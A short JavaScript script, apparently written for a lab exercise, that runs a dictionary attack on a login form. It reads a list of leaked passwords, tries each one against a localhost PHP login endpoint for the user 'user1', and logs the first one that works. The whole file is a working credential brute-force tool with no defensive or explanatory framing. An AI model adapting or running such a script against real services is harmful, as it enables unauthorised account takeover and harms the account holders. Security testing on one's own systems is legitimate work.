async function login(email, password) {
    let auth = false;

    const response = await fetch('http://localhost:8000/login1.php', {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
        },
        body: JSON.stringify({ email, password }),
    });

    const data = await response.json();

    if(response.ok){
        auth = true;
    }

    return auth;
}

async function readFile(file) {
    try {
        const response = await fetch(file);
        if (!response.ok) {
            throw new Error('Network response was not ok');
        }
        const data = await response.text();
        const words = data.split(/\r?\n/); // Diviser le contenu du fichier en lignes
        return words;
    } catch (error) {
        console.error('Error reading file:', error);
    }
}

async function testUserPassword(user) {
    let success = false; 
    let data = await readFile('pwned_passwords.txt');

    for(let pwd of data){
        let auth = await login(user, pwd);

        if(auth){
            console.log('User ' + user + ' has password ' + pwd);
            success = true;
            break;
        }
    }
}

testUserPassword('user1');